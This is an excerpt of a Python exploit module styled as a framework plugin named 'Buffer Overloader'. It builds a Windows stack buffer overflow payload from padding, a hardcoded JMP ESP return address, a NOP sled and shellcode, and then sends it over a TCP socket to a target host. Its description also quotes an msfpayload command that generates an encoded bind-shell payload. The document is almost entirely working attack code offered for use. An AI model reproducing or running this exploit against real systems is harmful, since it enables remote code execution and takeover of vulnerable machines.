...
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Buffer Overloader',
            'Rank':'Good',
            'Platform':'Windows',
            'architectures':'x86/64 bit processors',
            'Description': "Exploits Buffer Overloads in unpatched Vulnerbilities. its similar to (#./msfpayload windows/shell_bind_tcp r | ./msfencode -e x86/shikata_ga_nai -b '\x00\xff\x0d\x0a\x3d\x20' #[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1))'",
            ...
            'Options': OrderedDict([
                ...
                ('CMD', ('PWND', True, 'PWND,AUTH, APPE, ALLO, ACCT'))
             
                ])
                }
    def logo(self):
    	title = 'Buffer Overloader'
    	if pyfiglet:
            ...
            print(title)
    def help(self):
    	print("Usage: set RHOST <127.0.0.1> |  set PORT <port> | set CMD <command>  ,then run")
   
    
    def execute(self):
        target = self.info['Options']['RHOST'][0]
        port = self.info['Options']['PORT'][0]
        command = self.info['Options']['CMD'][0]
        self.logo()
...
"\xba\x1e\x53\x31")#7C874413 FFE4 JMP ESP kernel32.dll
        ret = struct.pack('<L', 0x7C874413)
        padding = "\x90" * 150
        crash = "\x41" * 246 + str(ret) + str(padding) + str(shellcode)
        print ("\
...
[*] Connecting to "+target)
        ...
        try:
            s.connect((target, int(8080)))
        except Exception as e:
            print(e)
            print ("[-] Connection to "+target+" failed!")
            sys.exit(0)
        print (f"[*] Sending {len(crash)} " + command +" byte crash...")
        ...
        time.sleep(4)
        return f"[*] Sending {len(crash)} " + command +" byte crash..."
